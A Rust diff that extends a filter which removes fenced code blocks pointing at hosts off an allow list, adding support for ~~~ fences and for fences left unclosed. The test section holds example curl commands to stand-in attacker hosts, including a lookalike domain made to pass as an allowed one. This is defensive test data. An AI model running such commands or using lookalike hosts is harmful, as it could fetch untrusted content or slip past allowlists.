@@ -291,20 +291,28 @@ pub fn confined(text: &str, allowed: &[String], lang: &str) -> (String, usize) {
     let mut out = String::with_capacity(text.len());
     let mut dropped = 0;
     let mut rest = text;
-    while let Some(open) = rest.find("```") {
+    // A fence is ``` or ~~~ (CommonMark), closed by the same marker; one left open runs to the
+    // end, as an answer cut at its token limit leaves it.
+    let next_fence = |text: &str| {
+        ["```", "~~~"]
+            .into_iter()
+            .filter_map(|fence| text.find(fence).map(|at| (at, fence)))
+            .min()
+    };
+    while let Some((open, fence)) = next_fence(rest) {
         let after = &rest[open + 3..];
-        let Some(close) = after.find("```") else {
-            break;
+        let (block, end) = match after.find(fence) {
+            Some(close) => (&after[..close], open + 3 + close + 3),
+            None => (after, rest.len()),
         };
-        let block = &after[..close];
         out.push_str(&rest[..open]);
         if foreign(block, allowed) {
             dropped += 1;
             out.push_str(removed(lang));
         } else {
-            out.push_str(&rest[open..open + 3 + close + 3]);
+            out.push_str(&rest[open..end]);
         }
-        rest = &after[close + 3..];
+        rest = &rest[end..];
     }
     out.push_str(rest);
     (out, dropped)
@@ -538,6 +546,12 @@ mod tests {
         assert_eq!(dropped, 1);
         assert!(!text.contains("example.com") && text.contains("mimo tento katalóg"));
         let lookalike = "```\ncurl https://api.dev.joinedcontext.com.evil.io/z\n```";
+        for other_fence in [
+            "~~~sh\ncurl https://evil.example/x\n~~~",
+            "Run this:\n```sh\ncurl https://evil.example/x",
+        ] {
+            assert_eq!(confined(other_fence, &hosts, "en").1, 1, "{other_fence}");
+        }
         assert_eq!(
             confined(lookalike, &hosts, "en").1,
             1,
